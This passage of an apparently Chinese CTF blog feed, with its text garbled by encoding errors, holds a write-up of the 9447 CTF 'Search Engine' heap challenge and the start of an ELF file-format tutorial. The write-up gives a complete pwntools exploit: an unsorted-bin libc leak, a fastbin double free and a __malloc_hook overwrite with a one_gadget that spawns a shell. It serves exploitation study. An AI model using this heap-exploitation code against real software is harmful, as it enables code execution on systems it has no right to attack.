class="string">&quot;Deleted!&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰¾åˆ°ä¹‹å‰æŠŠæ•´ä¸ªå¥å­éƒ½ç»™ç½®é›¶äº†ï¼Œä¹Ÿæ²¡æœ‰freeåç½®nullï¼Œä½†æ˜¯æˆ‘ä»¬çš„structåœ°å€éƒ½è¿˜åœ¨ç”¨ï¼Œå°±ä»è¿™é‡Œå¼€å§‹æŠŠ</p><h2 id="unsorted-binæ³„éœ²libc"><a href="#unsorted-binæ³„éœ²libc" class="headerlink" title="unsorted binæ³„éœ²libc"></a>unsorted binæ³„éœ²libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">smallbin_sentence = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿™æ ·ä¼šç”³è¯·åˆ°ä¸‰ä¸ªå †ï¼Œä¸€ä¸ªsentenceä¸¤ä¸ªwordï¼Œâ€˜ bâ€™-&gt;â€˜aâ€™*0x85ï¼Œæˆ‘ä»¬search(â€˜bâ€™)ï¼Œé‡Šæ”¾æ‰sentenceå †ï¼Œè¿™ä¸ªæ—¶å€™ç”³è¯·åˆ°çš„chunkå¤§å°0x90è¶…è¿‡äº†fastbinï¼Œè¿›å…¥unsortbinï¼Œunsorted binæ˜¯ä¸ªåŒå‘å¾ªç¯åˆ—è¡¨æ‰€ä»¥é‡Šæ”¾chunkçš„fdå’Œbkä¼šå¡«ä¸Šï¼Œunsortedbinçš„å¼€å§‹</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319221406963.png" alt="image-20230319221406963"></p><p>__ç”±äºé‡Šæ”¾åå•é“¾è¡¨è¿˜å­˜åœ¨æˆ‘ä»¬å†æ¬¡search,<code>if ( *i-&gt;sentence_ptr )</code>i-&gt;sentence_ptræ˜¯sentence chunkçš„fdæŒ‡é’ˆè¢«å¡«ä¸Šäº†unsorted binç»•è¿‡__ï¼Œä¸ºäº†ç»•è¿‡<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code>ï¼Œç¬¬ä¸€ä¸ªæˆ‘ä»¬çš„sizeè¿˜æ˜¯1ï¼Œç”±äºmemset(i-&gt;sentence_ptr, 0, i-&gt;len)ä¼šæŠŠæ•´ä¸ªå¥å­ç½®é›¶ï¼Œæœç´¢0å³å¯ç»•è¿‡,<code>fwrite(i-&gt;sentence_ptr, 1uLL, i-&gt;len, stdout);</code>ä¼šé…åˆæˆ‘ä»¬è¾“å‡ºå¤„bkå’Œfd</p><p>unsorted binåœ°å€è·ç¦»main_arena,main_arenaæ˜¯glibcé‡Œçš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œåç§»å›ºå®š0x3C4B20ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°libc</p><h2 id="fastbinå¾ªç¯é“¾è¡¨"><a href="#fastbinå¾ªç¯é“¾è¡¨" class="headerlink" title="fastbinå¾ªç¯é“¾è¡¨"></a>fastbinå¾ªç¯é“¾è¡¨</h2><p>ç”±äºfreeåæ²¡æœ‰ç½®é›¶ï¼Œæˆ‘ä»¬å¯ä»¥doublefreeï¼Œæ„æˆå¾ªç¯é“¾è¡¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p>éƒ½freeåa-&gt;b-&gt;c-&gt;0</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230319234446142.png" alt="image-20230319234446142"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br></pre></td></tr></table></figure><p>å†æ¬¡freeï¼Œè¿™é‡Œçš„cæ˜¯è¿‡ä¸äº†if ( *i-&gt;sentence_ptr )æ£€æµ‹çš„å› ä¸ºä»–æ˜¯ç¬¬ä¸€ä¸ªé‡Šæ”¾çš„chunkï¼Œfastbinå•é“¾è¡¨åªä½¿ç”¨fdæ‰§è¡Œå•å‘é“¾æ¥ï¼Œæ‰€ä»¥å¥¹çš„fdä¸º0</p><p>åªéœ€è¦å°†bé‡Šæ”¾è¿™æ ·b-&gt;fdæŒ‡å‘aï¼Œä¸”açš„fdæŒ‡å‘bï¼Œå¾ªç¯é“¾è¡¨</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230817100848581.png" alt="image-20230817100848581"></p><h2 id="å­—èŠ‚é”™ä½-Arbitrary-Alloc-and-malloc-hook"><a href="#å­—èŠ‚é”™ä½-Arbitrary-Alloc-and-malloc-hook" class="headerlink" title="å­—èŠ‚é”™ä½ Arbitrary Alloc and malloc hook"></a>å­—èŠ‚é”™ä½ Arbitrary Alloc and malloc hook</h2><p>æœ‰äº†å¾ªç¯é“¾è¡¨æˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ æˆ–è€…æ‰¾ä¸€ä¸ªfakechunkè¿›è¡Œç”³è¯·</p><p>æœ‰äº†main_arenaåœ°å€åï¼Œæˆ‘ä»¬æƒ³mallochookï¼Œmalloc__hookåœ¨main_areançš„ä¸Šé¢æ˜¯0x10å­—èŠ‚å¤„ï¼Œ</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000552113.png" alt="image-20230320000552113"></p><p>æˆ‘ä»¬ç›´æ¥ç”¨find_fake_faståœ¨ä¸Šé¢åˆ©ç”¨å­—èŠ‚é”™ä½æ‰¾åˆ°ä¸€ä¸ªchunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000725835.png" alt="image-20230320000725835"></p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320000936214.png" alt="image-20230320000936214"></p><p>fakechunkåç§»ä¸ºmain_areançš„ä¸Šé¢-0x33</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#<span class="meta">#<span class="keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ0x7f fastbin_indexåä¸º5ï¼Œ0x70çš„chunkï¼Œè¿™é‡Œç”±äºfastbinæ˜¯åˆ†ç»„çš„å•é“¾è¡¨ï¼Œåªæœ‰ç›¸åŒå¤§å°çš„freechunkæ‰ä¼šæ„æˆå•é“¾è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨å‰é¢æ„æˆå¾ªç¯é“¾è¡¨çš„å¤§å°ä¸º0x70ï¼Œå³ç”³è¯·0x60ï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦åœ¨ç”³è¯·0x60å¤§å°ç”³è¯·åˆ°è¿™ä¸ªfakechunk</p><table><thead><tr><th>fastbinsY[]</th><th>x86ï¼ˆsize_t&#x3D;4ï¼‰</th><th>x64ï¼ˆsize_t&#x3D;8ï¼‰</th></tr></thead><tbody><tr><td>0</td><td>0x10</td><td>0x20</td></tr><tr><td>1</td><td>0x18</td><td>0x30</td></tr><tr><td>2</td><td>0x20</td><td>0x40</td></tr><tr><td>3</td><td>0x28</td><td>0x50</td></tr><tr><td>4</td><td>0x30</td><td>0x60</td></tr><tr><td>5</td><td>0x38</td><td>0x70</td></tr><tr><td>6</td><td>0x40</td><td>0x80</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡ä¼šç”³è¯·åˆ°bï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥æ§åˆ¶bçš„fdæŒ‡é’ˆä¸ºfakechunk</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320002318652.png" alt="image-20230320002318652"></p><p>å†ç”³è¯·ä¸¤æ¬¡0x60å¤§å°chunkå°±å¯ä»¥ç”³è¯·åˆ°fakechunk</p><p>fakechunkè·ç¦»malloc_hook0x23,æˆ‘ä»¬æ˜¯å¾€fakechunk+0x10å†™æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦0x13å¤§å°padding</p><p>å†™å…¥onegadget</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/Desktop&gt; one_gadget ./libc-2.23.so </span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shell,è·‘è·¯å–½</p><p><img src="/2023/03/19/2015-9447-CTF-Search-Engine/image-20230320003959634.png" alt="image-20230320003959634"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./search&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_sentence</span>(<span class="params">s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the sentence size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(s)).encode())</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_word</span>(<span class="params">word</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;3: Quit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter the word size:\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(word)).encode())</span><br><span class="line">    io.send(word)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x400B41&#x27;)#judge</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x0400B41&#x27;)# rcx</span></span><br><span class="line"><span class="comment"># db(&#x27;b *0x400BED&#x27;)</span></span><br><span class="line">smallbin_sentence = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x85</span> + <span class="string">b&#x27; b&#x27;</span></span><br><span class="line">index_sentence(smallbin_sentence)</span><br><span class="line">search_word(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Found 135: &#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;c&#x27;</span> * <span class="number">0x5e</span> + <span class="string">b&#x27; d&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">search_word(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)  <span class="comment">#b</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#a</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Delete this sentence (y/n)?\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;n&#x27;</span>)  <span class="comment">#first chunk</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fakechunk=main_arena-<span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fakechunk).ljust(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(fake_chunk)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">index_sentence(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">index_sentence(<span class="string">b&#x27;b&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">one_gadget_addr = libc + <span class="number">0xf1247</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">index_sentence(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Byte misalignmen </tag>
            
            <tag> Double Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELFæ–‡ä»¶è§£æ(ELF File Parsing)</title>
      <link href="/2023/03/19/23-2-21-elf/"/>
      <url>/2023/03/19/23-2-21-elf/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-File-Parsing"><a href="#ELF-File-Parsing" class="headerlink" title="ELF File Parsing"></a>ELF File Parsing</h1><p>â€‹<strong>Executable and Linkable Format</strong></p><p>å®éªŒææ–™ï¼š010editor readelf objdump linux_lsæ–‡ä»¶(x86-64)</p><p>èµ„æ–™è®²è§£32ä½elfï¼Œå®éªŒè§£æ64ä½elf</p><p>lsæ–‡ä»¶ä¿¡æ¯</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA">https://pan.baidu.com/s/17ElUYwRhtW0eRRED4SgNDA</a><br>æå–ç ï¼šldss</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/test]</span><br><span class="line">â””â”€$ checksec ./ls    </span><br><span class="line">[*] &#x27;/home/kali/Desktop/test/ls&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled                                                    </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/test]</span><br><span class="line">â””â”€$ file ./ls    </span><br><span class="line">./ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=15dfff3239aa7c3b16a71e6b2e3b6e4009dab998, for GNU/Linux 3.2.0, stripped</span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/test]</span><br><span class="line">â””â”€$ ldd ./ls               </span><br><span class="line">        linux-vdso.so.1 (0x00007ffcd2d86000)</span><br><span class="line">        libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ff70107a000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff700e99000)</span><br><span class="line">        libpcre2-8.so.0 =&gt; /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007ff700dff000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007ff7010e6000)</span><br></pre></td></tr></table></figure><table><thead><tr><th>åç§°</th><th>é•¿åº¦</th><th>å¯¹é½æ–¹å¼</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>Elf32_Addr</td><td>4</td><td>4</td><td>æ— ç¬¦å·ç¨‹åºåœ°å€</td></tr><tr><td>Elf32_Half</td><td>2</td><td>2</td><td>æ— ç¬¦å·åŠæ•´å‹</td></tr><tr><td>Elf32_Off</td><td>4</td><td>4</td><td>æ— ç¬¦å·æ–‡ä»¶åç§»</td></tr><tr><td>Elf32_Sword</td><td>4</td><td>4</td><td>æœ‰ç¬¦å·å¤§æ•´å‹</td></tr><tr><td>Elf32_Word</td><td>4</td><td>4</td><td>æ— ç¬¦å·å¤§æ•´å‹</td></tr><tr><td>unsigned char</td><td>1</td><td>1</td><td>æ— ç¬¦å·å°æ•´å‹</td></tr></tbody></table><p><img src="/2023/03/19/23-2-21-elf/image-20230221233642860.png" alt="image-20230221233642860"></p><h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><ul><li>ELFæ–‡ä»¶å¤´è¡¨ï¼ˆELF headerï¼‰<ul><li>è®°å½•äº†ELFæ–‡ä»¶çš„ç»„ç»‡ç»“æ„</li></ul></li></ul><p>é™¤äº†ELFå¤´éƒ¨è¡¨ä»¥å¤–ï¼Œå…¶å®ƒéƒ¨åˆ†éƒ½æ²¡æœ‰ä¸¥æ ¼çš„é¡ºåºã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELFæ–‡ä»¶æ ‡è¯† */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/* æ–‡ä»¶ç±»å‹ */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/* æœºå™¨ç±»å‹ */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/* æ–‡ä»¶ç‰ˆæœ¬ */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/* ç¨‹åºå…¥å£åœ°å€ */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/* ç¨‹åºå¤´è¡¨åç§» */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/* èŠ‚å¤´è¡¨åç§» */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/* æ–‡ä»¶æ ‡å¿— */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELFå¤´å¤§å° */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/* ç¨‹åºå¤´è¡¨é¡¹å¤§å° */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/* ç¨‹åºå¤´è¡¨é¡¹æ•°é‡ */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/* èŠ‚å¤´è¡¨é¡¹å¤§å° */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/* èŠ‚å¤´è¡¨é¡¹æ•°é‡ */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/* èŠ‚å¤´è¡¨å­—ç¬¦ä¸²è¡¨ç´¢å¼• */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â””â”€$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2&#x27;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              DYN (Position-Independent Executable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          64 (bytes into file)</span><br><span class="line">  Start of section headers:          149360 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               64 (bytes)</span><br><span class="line">  Size of program headers:           56 (bytes)</span><br><span class="line">  Number of program headers:         13</span><br><span class="line">  Size of section headers:           64 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 30</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="e-dient"><a href="#e-dient" class="headerlink" title="e_dient"></a>e_dient</h3><ul><li>å…±16ä¸ªå­—èŠ‚</li><li>å¤´4ä¸ªå­—èŠ‚ï¼Œè¢«ç§°ä½œ â€œé­”æ•°â€ï¼Œæ ‡è¯†è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ª ELF ç›®æ ‡æ–‡ä»¶ã€‚å›ºå®šä¸º<code>7f 45 4c 46</code>(.ELF)ï¼Œå’Œwindowsä¸‹PE(Portable Executable)æ–‡ä»¶çš„<code>4D 5A</code>(MZ)ç±»ä¼¼ï¼Œæ”¹æ‰ä¼šå´©æºƒ</li><li>ä¸‹ä¸€ä¸ªå­—èŠ‚æ ‡è¯†æ–‡ä»¶çš„ç±»å‹ <ul><li>0æ— æ•ˆç±»å‹ </li><li>1 32æ–‡ä»¶ </li><li>2 64ä½æ–‡ä»¶</li></ul></li><li>ä¸‹ä¸€ä¸ªå­—èŠ‚æ ‡è¯†æ•°æ®çš„ç¼–ç æ–¹å¼<ul><li>0 æ— æ•ˆ</li><li>1 å°ç«¯åº LSB</li><li>2 å¤§ç«¯åº MSB</li></ul></li><li>åé¢å­—èŠ‚ä¸çœ‹äº†ï¼Œå› ä¸ºé™¤äº†.ELFç­¾åï¼Œå…¶ä»–æ²¡æœ‰ç”¨,æ”¹æ‰åç¨‹åºä¾æ—§å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œåªæ˜¯ä¼šè¿·æƒ‘æ‰è§£æè½¯ä»¶ç½¢äº†</li></ul><p><img src="/2023/03/19/23-2-21-elf/image-20230221231314941.png" alt="image-20230221231314941"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â””â”€$ readelf -h ./ls</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 0e ee ee ee ee ee ee ee ee ee ee ee </span><br><span class="line">  Class:                             &lt;unknown: e&gt;</span><br><span class="line">  Data:                              &lt;unknown: ee&gt;</span><br><span class="line">  Version:                           238 &lt;unknown&gt;</span><br><span class="line">  OS/ABI:                            &lt;unknown: ee&gt;</span><br><span class="line">  ABI Version:                       238</span><br><span class="line">  Type:                              DYN (Shared object file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86-64</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x61d0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          64 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               18288 (bytes)</span><br><span class="line">  Size of program headers:           2 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           0 (bytes)</span><br><span class="line">  Number of section headers:         0</span><br><span class="line">  Section header string table index: 0</span><br><span class="line">readelf: Warning: possibly corrupt ELF file header - it has a non-zero section header offset, but no section headers</span><br></pre></td></tr></table></figure><h3 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h3><p>ä¸èƒ½éšæ„ä¿®æ”¹</p><table><thead><tr><th align="left">åç§°</th><th align="left">å€¼</th><th 